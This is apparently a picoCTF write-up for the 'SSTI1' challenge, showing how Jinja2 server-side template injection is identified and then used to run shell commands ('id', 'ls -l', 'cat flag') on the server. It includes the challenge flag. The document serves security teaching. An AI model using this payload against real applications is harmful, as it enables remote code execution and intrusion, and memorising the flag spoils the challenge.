# SSTI1

- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
- [References](#references)

## Challenge information
```text
Tags: Web Exploitation, browser_webshell_solvable

Description:
I made a cool website where you can announce whatever you want! 
Try it out!
I heard templating is a cool and modular way to build web apps! 

Hints:
1. Server Side Template Injection
```
## Overview
Website where you can announce whatever you want!  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/922068b0-da07-44fc-8dea-1b1c0d59735b" />  

It can be seen that the web will reflect back what we enter into the box  
## Solution
**Step1:** Recon   
The hint has already given away that the site uses [server-side templates](https://portswigger.net/web-security/server-side-template-injection)   
But we need to verify that and find out the backend technology used.  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/cf0e6014-f747-4d73-ae87-9ea984611d90" />  
  
The tests done are as follows:
  
1. Entering `${7*7}` yields `${7*7}`,
2. Entering `{{7*7}}` yields `49` and
3. `{{7*'7'}}` yields `7777777`
  
So now we know we have a Jinja2 backend.  

**Step2:** Now we will enter: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` to see what the web returns  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/93ea84df-579e-4302-a007-3460b85da70e" />  
Web has actually executed our `Id` statement  
**Step3:** Exploit  
Now we will find where the flag is using `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -l').read() }}`  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/04400d8f-bbf3-4dc0-8a2f-99ab81916c38" />   

## FLag
Use `cat flag` to read  
Flag will be returned  
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}  

## References
See more : [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)




